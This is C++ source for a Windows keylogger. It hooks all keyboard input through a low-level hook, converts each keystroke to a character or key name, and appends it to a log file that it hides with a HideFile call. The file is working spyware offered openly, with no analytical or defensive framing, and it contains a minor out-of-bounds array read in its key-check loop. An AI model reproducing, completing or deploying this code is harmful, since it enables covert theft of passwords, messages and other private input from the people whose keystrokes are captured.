#include "Keylogger.h"

HHOOK hKeyboardHook;

DWORD WINAPI Run(void)
{
	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, Keylogger, GetModuleHandle(NULL), 0);

	ProcessMessage();

	UnhookWindowsHookEx(hKeyboardHook);
	hKeyboardHook = NULL;

	return 0;
}

LRESULT CALLBACK Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT*)lParam);
	HKL keyboard_layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0));
	WORD symbol = NULL;
	BYTE keyboard_state[256];
	wchar_t unicodesymbol = NULL;
	char lpzsname[0x100] = { 0 };
	DWORD dwMsg = 1;
	int keys[9] = { 0x08, 0x0d, 0x10, 0x11, 0x12, 0x14, 0x1b, 0x2e, 0x00 };
	bool flag_sys = false;
	ofstream out;

	out.open("KeyloggerLog.txt", ios::app);
	HideFile("KeyloggerLog.txt");

	GetKeyboardState(keyboard_state);

	dwMsg += cKey.scanCode << 16;
	dwMsg += cKey.flags << 24;

	GetKeyNameText(dwMsg, (LPTSTR)lpzsname, 255);

	//ToUnicodeEx(cKey.vkCode, cKey.scanCode, keyboard_state, &unicodesymbol, 1, 0, keyboard_layout);
	ToAsciiEx(cKey.vkCode, cKey.scanCode, keyboard_state, &symbol, 0, keyboard_layout);

	for (int i = 0; i < 10; i++)
	{
		if (symbol == keys[i])
			flag_sys = true;
	}

	if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && flag_sys == false)
	{
		cout << (char)symbol;
		out << (char)symbol;
	}
	if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && flag_sys == true)
	{
		cout << "[" << lpzsname << "]";
		out << "[" << lpzsname << "]";
	}
	out.close();

	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}